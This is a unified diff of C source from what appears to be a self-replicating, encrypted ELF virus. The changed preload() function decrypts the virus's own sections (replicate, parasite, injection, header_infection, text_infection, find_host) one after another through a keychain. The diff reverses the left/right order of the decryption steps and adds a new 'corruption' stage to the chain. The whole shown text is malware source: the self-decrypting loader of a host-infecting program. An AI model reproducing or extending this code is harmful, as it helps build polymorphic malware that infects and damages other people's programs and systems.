@@ -33,38 +33,41 @@ void preload(void)
 
 	struct s_keychain keychain = {0};
 
-	update_keychain_right(&keychain, (char *)replicate, (void *)autodestruction - (void *)replicate);
-	decrypt_right(&keychain, (char *)autodestruction, (void *)execution - (void *)autodestruction);
+	update_keychain_left(&keychain, (char *)replicate, (void *)autodestruction - (void *)replicate);
+	decrypt_left(&keychain, (char *)autodestruction, (void *)execution - (void *)autodestruction);
 
-	update_keychain_left(&keychain, (char *)clean, (void *)replicate - (void *)clean);
-	decrypt_left(&keychain, (char *)replicate, (void *)autodestruction - (void *)replicate);
+	update_keychain_right(&keychain, (char *)clean, (void *)replicate - (void *)clean);
+	decrypt_right(&keychain, (char *)replicate, (void *)autodestruction - (void *)replicate);
 
-	update_keychain_right(&keychain, (char *)sign, (void *)clean - (void *)sign);
-	decrypt_right(&keychain, (char *)clean, (void *)replicate - (void *)clean);
+	update_keychain_left(&keychain, (char *)sign, (void *)clean - (void *)sign);
+	decrypt_left(&keychain, (char *)clean, (void *)replicate - (void *)clean);
 
-	update_keychain_left(&keychain, (char *)stub, (void *)sign - (void *)stub);
-	decrypt_left(&keychain, (char *)sign, (void *)clean - (void *)sign);
+	update_keychain_right(&keychain, (char *)stub, (void *)sign - (void *)stub);
+	decrypt_right(&keychain, (char *)sign, (void *)clean - (void *)sign);
 
-	update_keychain_right(&keychain, (char *)parasite, (void *)stub - (void *)parasite);
-	decrypt_right(&keychain, (char *)stub, (void *)sign - (void *)stub);
+	update_keychain_left(&keychain, (char *)parasite, (void *)stub - (void *)parasite);
+	decrypt_left(&keychain, (char *)stub, (void *)sign - (void *)stub);
 
-	update_keychain_left(&keychain, (char *)injection, (void *)parasite - (void *)injection);
-	decrypt_left(&keychain, (char *)parasite, (void *)stub - (void *)parasite);
+	update_keychain_right(&keychain, (char *)injection, (void *)parasite - (void *)injection);
+	decrypt_right(&keychain, (char *)parasite, (void *)stub - (void *)parasite);
 
-	update_keychain_right(&keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
-	decrypt_right(&keychain, (char *)injection, (void *)parasite - (void *)injection);
+	update_keychain_left(&keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
+	decrypt_left(&keychain, (char *)injection, (void *)parasite - (void *)injection);
 
-	update_keychain_left(&keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
-	decrypt_left(&keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
+	update_keychain_right(&keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
+	decrypt_right(&keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
 
-	update_keychain_right(&keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
-	decrypt_right(&keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
+	update_keychain_left(&keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
+	decrypt_left(&keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
 
-	update_keychain_left(&keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
-	decrypt_left(&keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
+	update_keychain_right(&keychain, (char *)corruption, (void *)text_infection - (void *)corruption);
+	decrypt_right(&keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
+
+	update_keychain_left(&keychain, (char *)criteria, (void *)corruption - (void *)criteria);
+	decrypt_left(&keychain, (char *)corruption, (void *)text_infection - (void *)corruption);
 
 	update_keychain_right(&keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);
-	decrypt_right(&keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
+	decrypt_right(&keychain, (char *)criteria, (void *)corruption - (void *)criteria);
 
 	update_keychain_left(&keychain, (char *)find_host, (void *)host_constructor - (void *)find_host);
 	decrypt_left(&keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);
